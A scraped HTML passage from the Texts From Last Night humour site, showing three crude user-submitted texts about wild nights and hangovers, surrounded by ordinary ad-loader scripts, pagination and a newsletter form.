	   }	   </script>
          </div><div id="contentad-slot-11"></div>
	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-407.html">(407): <span>View more from Florida</span></a></h3>
<p><a href="/Text-Replies-73112.html">There is a moment when you wake up with a butt plug in when you question your choices in life.</a></p>
<div class="reply">
	<h3><a href="/Texts-From-Areacode-321.html">(321): <span>View more from Florida Space Coast</span></a></h3>
	<p><a href="/Text-Replies-73112.html">There is also a moment when you wake up in a kiddie pool of jello cubes where you question what the fuck you did last night. Are you still in the attic or did you go home.</a></p>
</div>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73112.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73112" data-href="/Vote-Up-Text-73112.json"><span>13</span></a>
            <a class="bad-night" id="N-73112" data-href="/Vote-Down-Text-73112.json"><span>5</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73112.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(407): There is a moment when you wake up with a butt plug in when you question your choices in life.
(321): There is also a moment w... @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>
<div id="contentad-slot-12"></div>
	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-903.html">(903): <span>View more from Texas</span></a></h3>
<p><a href="/Text-Replies-73111.html">Ever had one of those went so hard last night you woke up at the foot of the bed naked wondering where your phone ended up?</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73111.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73111" data-href="/Vote-Up-Text-73111.json"><span>16</span></a>
            <a class="bad-night" id="N-73111" data-href="/Vote-Down-Text-73111.json"><span>5</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73111.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(903): Ever had one of those went so hard last night you woke up at the foot of the bed naked wondering where your phone ended up?... @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>

	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-309.html">(309): <span>View more from Illinois</span></a></h3>
<p><a href="/Text-Replies-73110.html">Ive seen a birth plenty of times, pretty awesome like a bear trying to climb out of a volkswagon.</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73110.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73110" data-href="/Vote-Up-Text-73110.json"><span>14</span></a>
            <a class="bad-night" id="N-73110" data-href="/Vote-Down-Text-73110.json"><span>9</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73110.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(309): Ive seen a birth plenty of times, pretty awesome like a bear trying to climb out of a volkswagon. @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>
   <div class="ad-text phone-tablet-only">
      ADVERTISEMENT
   </div>
<div id='div-gpt-ad-8675309-mobile-5' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_phone_or_tablet) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-8675309-mobile-5'); });
	   }	   </script>
          </div></ul>




        <div id="ad-bottom" class="mobile-hide desktop-only">
          <div class="ad-text">
            ADVERTISEMENT
          </div>
          <div id='div-gpt-ad-1460580604140-1' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_desktop) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1460580604140-1'); });
	   }	   </script>
          </div>        </div>

        <div class='page_footer'>
                    <ul class="pagination"><li class="selected">1</li><li><a href="/texts/page:2">2</a></li><li><a href="/texts/page:3">3</a></li><li><a href="/texts/page:4">4</a></li><li><a href="/texts/page:5">5</a></li><li>&hellip; <a href="/texts/page:5218">5218</a></li><li class="next"><a href="/texts/page:2">next page</a></li></ul>
<div class='jump'>
	<label>Or, jump to page:</label>
	<input type='hidden' id='page_url' value='/texts/page:XX' />
	<input size='5' type='text' />
	<a href="#">Go</a>
</div>
          <div id="contentad142449"></div>
<script type="text/javascript">
    (function(d) {
        var params =
        {
            id: "bb1c5dce-a50c-4a19-9534-bd2e84da333d",
            d:  "dGV4dHNmcm9tbGFzdG5pZ2h0LmNvbQ==",
            wid: "142449",
            cb: (new Date()).getTime()
        };
        var qs=[];
        for(var key in params) qs.push(key+'='+encodeURIComponent(params[key]));
        var s = d.createElement('script');s.type='text/javascript';s.async=true;
        var p = 'https:' == document.location.protocol ? 'https' : 'http';
        s.src = p + "://api.content.ad/Scripts/widget2.aspx?" + qs.join('&');
        d.getElementById("contentad142449").appendChild(s);
    })(document);
</script>
        </div>
      </div>

      <div id='sidebar' class="sidebar-hide">

        <div class='box'>

          <div class="scroll-spacer-right"></div>

          <div id="first-side-group">
            <div class="side-ad">
              <div class="ad-text">
                ADVERTISEMENT
              </div>
              <div id='div-gpt-ad-1460580604140-2' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_desktop) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1460580604140-2'); });
	   }	   </script>
          </div>            </div>
            <div class="side-non-ad" >
            <div class="social-follow-box mobile-hide">
              <div class="facebook-connect"><a href="http://www.facebook.com/textsfromlastnight"><i class="fa fa-facebook-square"></i> Like Us on Facebook</a></div>
              <div class="twitter-connect"><a href="http://www.twitter.com/textsfromlastnight"><i class="fa fa-twitter"></i> Follow Us on Twitter</a></div>
              <div class="instagram-connect"><a href="http://www.instagram.com/textsfromlastnight"><i class="fa fa-instagram"></i> Follow Us on Instagram</a></div>
            </div>
  <div class="sidebar-post">
    <div class="thumbnail-image"><a href="http://tfln.co/funny-tumblr-posts-starbucks/"><img src="http://tfln.co/wp-content/uploads/2018/03/Screen_Shot_2017-12-05_at_7.18.41_PM_hfohbw-1200x630.jpg" /></a></div>
    <h4><a href="http://tfln.co/funny-tumblr-posts-starbucks/">Just 30 Funny Tumblr Posts About Starbucks</a></h4>
  </div>
  <div class="sidebar-post">
    <div class="thumbnail-image"><a href="http://tfln.co/people-are-aholes-also-completely-hilarious/"><img src="http://tfln.co/wp-content/uploads/2018/03/kindadicks.jpg" /></a></div>
    <h4><a href="http://tfln.co/people-are-aholes-also-completely-hilarious/">18 People Are Kind Of A**holes But Also Completely Hilarious</a></h4>
  </div>
            </div>
          </div>

          <div id="second-side-group" class="absolute">
            <div class="side-ad">
              <div class="ad-text">
                ADVERTISEMENT
              </div>
              <div id='div-gpt-ad-1460580604140-3' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_desktop) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1460580604140-3'); });
	   }	   </script>
          </div>            </div>
            <div class="side-ad">
              <div style="max-width: 300px;">
		<div id="rcjsload_f9f688"></div>
		<script type="text/javascript">
		  (function() {
		  if (!window.tfln_is_desktop) { return; }
		  var referer="";try{if(referer=document.referrer,"undefined"==typeof referer)throw"undefined"}catch(exception){referer=document.location.href,(""==referer||"undefined"==typeof referer)&&(referer=document.URL)}referer=referer.substr(0,700);
		  var rcel = document.createElement("script");
		  rcel.id = 'rc_' + Math.floor(Math.random() * 1000);
		  rcel.type = 'text/javascript';
		  rcel.src = "http://trends.revcontent.com/serve.js.php?w=13203&t="+rcel.id+"&c="+(new Date()).getTime()+"&width="+(window.outerWidth || document.documentElement.clientWidth)+"&referer="+referer;
		  rcel.async = true;
		  var rcds = document.getElementById("rcjsload_f9f688"); rcds.appendChild(rcel);
		  })();
		</script>
              </div>
            </div>
          </div>

          <br /><br />

        </div>

      </div>

    </div>

  </div>

<div id="leadgen" class="modal">
  <div class="modal-container">
    <div class="close">
      <i class="fa fa-times"></i>
    </div>
    <h1>Quick! While no one's looking</h1>
    <h3>Click this little button for TFLN texts and updates<i class="fa fa-arrow-down" aria-hidden="true"></i></h3>
    <div id="fb-like-container">
      <div class="fb-like" data-href="http://facebook.com/textsfromlastnight" data-width="100px" data-layout="button_count" data-action="like" data-size="large" data-show-faces="false" data-share="false"></div>
    </div>
    <h2>We also send dope emails</h2>
    <h3>Forget to check the site? We’ll send our best texts, memes and weekly shenanigans straight to your inbox.</h3>
    <form action="http://news.textsfromlastnight.com/subscribe" method="POST" accept-charset="utf-8">
      <input type="email" name="email" id="email" placeholder="Your email address..." />
      <input type="hidden" name="list" value="MigaV763eXetx7639j4J763c30gA"/>
      <input type="submit" name="submit" id="submit"/>
    </form>
    <h5>already like us? well thanks! <a href="#" class="close-modal">click here</a>.</h5>
  </div>
</div>

<div id='div-gpt-ad-exitpop' style='height:1px; width:1px;'>
           <script type='text/javascript'>
	              googletag.cmd.push(function() { googletag.display('div-gpt-ad-exitpop'); });
	   	   </script>
          </div>
    <footer id='footer'>
      <div class="container desktop-only">
        <ul class='footer-links'>
          <li><a href="/">Home</a></li>
          <li><a href="/Texts-From-Best-Nights.html">Best Nights</a></li>
          <li><a href="/Texts-From-Worst-Nights.html">Worst Nights</a></li>
          <li><a href="/Random-Texts-From-Last-Night.html?t=5821068">Random</a></li>
          <li><a href="/About-Texts-From-Last-Night.html">About</a></li>
          <li><a href="/Texts-By-Areacode.html">Areacodes</a></li>
          <li><a href="/Contact-TFLN.html">Advertise</a></li>
          <li><a href="/Terms.html">Terms</a></li>
        </ul>
        <p class='copyright'>
          &copy; 2009-2015 Texts From Last Night Inc. &nbsp; | &nbsp; design by <a href="http://www.markmakes.com">MarkMakes</a>
        </p>
      </div>
    </footer>

    
    <script>(function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];g.src="//x.instagramfollowbutton.com/follow.js";s.parentNode.insertBefore(g,s);}(document,"script"));</script>

<div id='div-gpt-ad-slider' style='height:1px; width:1px;'>
           <script type='text/javascript'>
	              googletag.cmd.push(function() { googletag.display('div-gpt-ad-slider'); });
	   	   </script>
          </div>
<div id="ry_slider"></div>
<script type="text/javascript">
    window["_rocketyield"] = [];
    !function (e, f, u) {
        e.async = 1;
        e.src = u;
        f.parentNode.insertBefore(e, f);
    }(document.createElement("script"), document.getElementsByTagName("script")[0], "//d1gqcw1vqdwn9k.cloudfront.net/ry.min.js");
    window["_rocketyield"].push({
        pid: "j0oe7lcn",
        placementId: "j1cnyo82",
        slot: "#ry_slider"
    });
</script>
  </body>
</html>